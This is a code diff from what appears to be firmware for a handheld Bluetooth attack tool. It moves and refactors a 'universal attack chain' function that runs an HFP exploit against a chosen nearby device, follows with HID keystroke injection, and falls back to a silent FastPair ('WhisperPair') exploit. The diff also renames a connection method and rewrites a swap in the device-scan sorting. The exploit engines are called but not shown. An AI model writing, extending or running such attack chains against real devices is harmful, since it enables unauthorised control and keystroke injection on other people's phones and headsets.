@@ -175,7 +175,7 @@ NimBLEClient* attemptConnectionWithStrategies(NimBLEAddress target, String& conn
     if(hasHFP) {
         showAttackProgress("Trying HFP exploit connection...", TFT_CYAN);
         HFPExploitEngine hfp;
-        NimBLEClient* hfpClient = hfp.attemptHFPConnection(target);
+        NimBLEClient* hfpClient = hfp.establishHFPConnection(target);
         if(hfpClient) {
             connectionMethod = "HFP Exploit connection";
             return hfpClient;
@@ -2828,6 +2828,68 @@ void executeSelectedAttack(int attackIndex, NimBLEAddress target) {
     }
 }
 
+void runUniversalAttack(NimBLEAddress target) {
+    if(!confirmAttack("Execute universal attack chain (HFP + HID + FastPair)?")) return;
+    
+    String deviceName = "";
+    int rssi = -60;
+    bool hasHFP = false;
+    bool hasFastPair = false;
+    
+    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
+        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
+            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
+                deviceName = scannerData.deviceNames[i];
+                rssi = scannerData.deviceRssi[i];
+                hasHFP = scannerData.deviceHasHFP[i];
+                hasFastPair = scannerData.deviceFastPair[i];
+                break;
+            }
+        }
+        xSemaphoreGive(scannerData.mutex);
+    }
+    
+    std::vector<String> lines;
+    lines.push_back("UNIVERSAL ATTACK CHAIN");
+    lines.push_back("Device: " + deviceName);
+    lines.push_back("HFP: " + String(hasHFP ? "YES" : "NO"));
+    lines.push_back("FastPair: " + String(hasFastPair ? "YES" : "NO"));
+    
+    bool hfpSuccess = false;
+    bool fpSuccess = false;
+    bool hidSuccess = false;
+    
+    if(hasHFP) {
+        showAttackProgress("Phase 1: Testing HFP vulnerability...", TFT_CYAN);
+        HFPExploitEngine hfp;
+        hfpSuccess = hfp.executeHFPAttackChain(target);
+        lines.push_back("HFP Attack: " + String(hfpSuccess ? "SUCCESS" : "FAILED"));
+        
+        if(hfpSuccess) {
+            showAttackProgress("HFP success! Phase 2: HID injection...", TFT_GREEN);
+            HIDAttackServiceClass hidAttack;
+            hidSuccess = hidAttack.injectKeystrokes(target);
+            lines.push_back("HID Injection: " + String(hidSuccess ? "SUCCESS" : "FAILED"));
+        }
+    }
+    
+    if(hasFastPair && (!hfpSuccess || !hidSuccess)) {
+        showAttackProgress("Phase 3: Testing FastPair vulnerability...", TFT_BLUE);
+        WhisperPairExploit exploit;
+        fpSuccess = exploit.executeSilent(target);
+        lines.push_back("FastPair Attack: " + String(fpSuccess ? "SUCCESS" : "FAILED"));
+    }
+    
+    lines.push_back("");
+    lines.push_back("Attack chain completed");
+    
+    if(hfpSuccess || fpSuccess || hidSuccess) {
+        showDeviceInfoScreen("ATTACK SUCCESS", lines, TFT_GREEN, TFT_BLACK);
+    } else {
+        showDeviceInfoScreen("ATTACK FAILED", lines, TFT_RED, TFT_WHITE);
+    }
+}
+
 void runWhisperPairAttack(NimBLEAddress target) {
     bool hasHFP = false;
     
@@ -3805,68 +3867,6 @@ void runHFPHIDPivotAttack(NimBLEAddress target) {
     }
 }
 
-void runUniversalAttack(NimBLEAddress target) {
-    if(!confirmAttack("Execute universal attack chain (HFP + HID + FastPair)?")) return;
-    
-    String deviceName = "";
-    int rssi = -60;
-    bool hasHFP = false;
-    bool hasFastPair = false;
-    
-    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
-            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
-                deviceName = scannerData.deviceNames[i];
-                rssi = scannerData.deviceRssi[i];
-                hasHFP = scannerData.deviceHasHFP[i];
-                hasFastPair = scannerData.deviceFastPair[i];
-                break;
-            }
-        }
-        xSemaphoreGive(scannerData.mutex);
-    }
-    
-    std::vector<String> lines;
-    lines.push_back("UNIVERSAL ATTACK CHAIN");
-    lines.push_back("Device: " + deviceName);
-    lines.push_back("HFP: " + String(hasHFP ? "YES" : "NO"));
-    lines.push_back("FastPair: " + String(hasFastPair ? "YES" : "NO"));
-    
-    bool hfpSuccess = false;
-    bool fpSuccess = false;
-    bool hidSuccess = false;
-    
-    if(hasHFP) {
-        showAttackProgress("Phase 1: Testing HFP vulnerability...", TFT_CYAN);
-        HFPExploitEngine hfp;
-        hfpSuccess = hfp.executeHFPAttackChain(target);
-        lines.push_back("HFP Attack: " + String(hfpSuccess ? "SUCCESS" : "FAILED"));
-        
-        if(hfpSuccess) {
-            showAttackProgress("HFP success! Phase 2: HID injection...", TFT_GREEN);
-            HIDAttackServiceClass hidAttack;
-            hidSuccess = hidAttack.injectKeystrokes(target);
-            lines.push_back("HID Injection: " + String(hidSuccess ? "SUCCESS" : "FAILED"));
-        }
-    }
-    
-    if(hasFastPair && (!hfpSuccess || !hidSuccess)) {
-        showAttackProgress("Phase 3: Testing FastPair vulnerability...", TFT_BLUE);
-        WhisperPairExploit exploit;
-        fpSuccess = exploit.executeSilent(target);
-        lines.push_back("FastPair Attack: " + String(fpSuccess ? "SUCCESS" : "FAILED"));
-    }
-    
-    lines.push_back("");
-    lines.push_back("Attack chain completed");
-    
-    if(hfpSuccess || fpSuccess || hidSuccess) {
-        showDeviceInfoScreen("ATTACK SUCCESS", lines, TFT_GREEN, TFT_BLACK);
-    } else {
-        showDeviceInfoScreen("ATTACK FAILED", lines, TFT_RED, TFT_WHITE);
-    }
-}
-
 void runMultiTargetAttack() {
     std::vector<NimBLEAddress> targets;
     String selected = selectMultipleTargetsFromScan("SELECT TARGETS", targets);
@@ -4140,7 +4140,9 @@ String selectTargetFromScan(const char* title) {
                     scannerData.deviceFastPair[i] = scannerData.deviceFastPair[j];
                     scannerData.deviceFastPair[j] = tempFastPair;
 
-                    std::swap(scannerData.deviceHasHFP[i], scannerData.deviceHasHFP[j]);
+                    bool tempHFP = scannerData.deviceHasHFP[i];
+                    scannerData.deviceHasHFP[i] = scannerData.deviceHasHFP[j];
+                    scannerData.deviceHasHFP[j] = tempHFP;
                     std::swap(scannerData.deviceTypes[i], scannerData.deviceTypes[j]);
                 }
             }
